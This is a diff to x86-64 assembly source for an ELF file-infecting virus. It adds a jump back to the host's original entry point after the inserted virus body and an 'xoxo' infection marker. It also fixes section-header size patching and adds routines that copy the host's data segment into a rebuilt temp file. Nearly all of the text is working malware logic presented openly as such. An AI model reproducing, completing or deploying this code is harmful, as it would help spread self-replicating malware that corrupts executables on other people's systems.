@@ -725,8 +725,9 @@ infect:
 	mov r13, [r14+ 800]				;location on stack where we saved address returned from mmap syscall
 	mov r12, [r13 + elf_ehdr.e_phoff]		;address of host ELF Program Header Table in r12
 	mov r15, [r13 + elf_ehdr.e_shoff] 	;address of host ELF Section Header Table in r15
-	;move r13 to saved var hostentry_offset, 
-									;to be used for calculating offsets w writes to temp file
+	mov r8, [r13 + elf_ehdr.e_entry] 	;address of host ELF entry point in r8
+
+	mov dword [r13 + elf_ehdr.ei_padding], 0x786f786f		;infection marker string "xoxo" in elf_ehdr.e_padding
 	
 	;mov rdx, checkphdrstartlen
 	;lea rsi, checkphdrstart
@@ -834,7 +835,7 @@ infect:
 			cmp dword r11d, [vxoffset]
 			jne .mod_subsequent_shdr
 			mov dword r10d, [r13 + r15 + elf_shdr.sh_size]
-			add dword r10d, [vlen]
+			add dword r10d, vlen
 			mov dword [r13 + r15 + elf_shdr.sh_size], r10d
 
 			.mod_subsequent_shdr:
@@ -883,17 +884,15 @@ infect:
 ;
 ;	Our plan for building this file will be to do the following:
 ;	create new temp file ".xo.tmp"
-;	lseek to position 0 in .xo.tmp
 ;	write modified elf header to .xo.tmp
-;	write modified program header to .xo.tmp
-;	lseek to host text segment in host ELF 
+;	write modified program headers to .xo.tmp
 ;	copy (write) host text segment from host ELF to .xo.tmp
 ;	write virus body to .xo.tmp
 ;	write patched jmp to original host entry point (push ret), after  vx body in .xo.tmp
 ;	write any padding bytes needed to maintain page alignment for temp file
+;	write remaining segments [data segment to original Shdr offset] from host ELF to .xo.tmp
 ;	write modified section header table to .xo.tmp
-;	lseek to end of section header table in host ELF
-;	copy (write) remaining bytes (end of shdr table to EOF) from host ELF to .xo.tmp
+;	copy (write) remaining bytes (end of SHdr table to EOF) from host ELF to .xo.tmp
 ;	
 ;	TODO: add routine for renaming .xo.tmp to original host file name
 ;	TODO: add routine for changing permissions/owner of infected ELF to match 
@@ -916,28 +915,16 @@ frankenstein_elf:
 	mov rdi, rax
 
 	xor rdx, rdx
+	
 	;write ELF header to temp file
-	;actually just write the first 1024 bytes of target ELF to temp file
 
 	cmp dword [hostentry_offset], PAGESIZE
 	jl .adjust_offset_ehdr_phdr_copy
 	jmp .offset_ehdr_phdr_copy_pagesize
 	.adjust_offset_ehdr_phdr_copy:
-		;mov rdx, textsegmentoffset_pageno_len
-		;lea rsi, textsegmentoffset_pageno
-		;mov rdi, STDOUT
-		;mov rax, SYS_WRITE
-		;syscall
-
 		add dword edx, [vxoffset]
 		jmp .write_host_ehdr_phdrs_textsegment
 	.offset_ehdr_phdr_copy_pagesize:
-		;mov rdx, textsegmentoffset_pageyes_len
-		;lea rsi, textsegmentoffset_pageyes
-		;mov rdi, STDOUT
-		;mov rax, SYS_WRITE
-		;syscall
-		
 		mov rdx, [PAGESIZE]
 	.write_host_ehdr_phdrs_textsegment:	
 		mov rdi, r9
@@ -952,7 +939,18 @@ frankenstein_elf:
 		mov r10d, dword [vxoffset]
 		mov rax, SYS_PWRITE64
 		syscall
-		;mov rsi, rax
+
+	.write_jmp_to_oep:
+		mov rdx, 6
+		mov byte [r14 + 150], 0x68			;0x68 = push
+		mov dword [r14 + 152], r8d			;address of original host entry point
+		mov byte [r14 + 154], 0xc3			;0xc3 = ret
+		lea rsi, [r14+ 150]
+		mov r10d, dword [vxoffset]
+		add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
+		mov rax, SYS_PWRITE64
+		syscall
+		
 	
 	;ftruncate syscall will grow the size of file (corresponding to file descriptor fd)
 	; by n bytes, where n is a signed integer, passed in rsi
@@ -963,35 +961,23 @@ frankenstein_elf:
 		mov rax, SYS_FTRUNCATE
 		syscall
 ;		jmp .close_temp		
-	;.lseek_host_datasegment:
-	;	lea rsi, [r13 + elf_ehdr]					;r13 contains pointer to mmap'd file
 		
 
 	.write_datasegment_totemp:
-		;mov rdx, [r14 + filestat.st_size]
-		;sub edx, dword [oshoff]
 		mov rdx, [oshoff]
-		;sub edx, dword [data_offset_original]
 		sub edx, dword [vxoffset]
-		;add edx, dword [host_shdrs_len]
-		;mov rsi, [DATA_OFFSET_HOST]
-		lea rsi, [r13 + elf_ehdr]
-		;mov rdi, r9
-		; 0x900]						;r13 contains pointer to mmap'd file
-		;add rsi, qword [DATA_OFFSET_HOST]
-		add rsi, qword [data_offset_original]
-		;mov esi, dword [data_offset_new_padding]
+		lea rsi, [r13 + elf_ehdr]				;r13 contains pointer to mmap'd file
+		add rsi, qword [data_offset_original]	;adjust rsi address to point to original data segment offset of mmap'd file
 		mov r10d, dword [data_offset_new_padding]
 		mov rax, SYS_PWRITE64
 		syscall
-		jmp .close_temp		
+;		jmp .close_temp		
 
 	.write_patched_shdrs_totemp:
 		mov rdx, [r14 + filestat.st_size]
 		sub edx, dword [oshoff]
 		lea rsi, [r13 + elf_ehdr]
 		add rsi, qword [oshoff]
-		;mov rsi, [SHDR_OFFSET_HOST]
 		mov r10d, dword [vxshoff]
 		mov rax, SYS_PWRITE64
 		syscall
@@ -999,7 +985,6 @@ frankenstein_elf:
 
 		
 		;munmap file from work area
-		;mov qword rsi, [elf_filesize]
 		mov rdi, r13
 		mov rsi, [r14 + filestat.st_size]
 		mov rax, SYS_MUNMAP
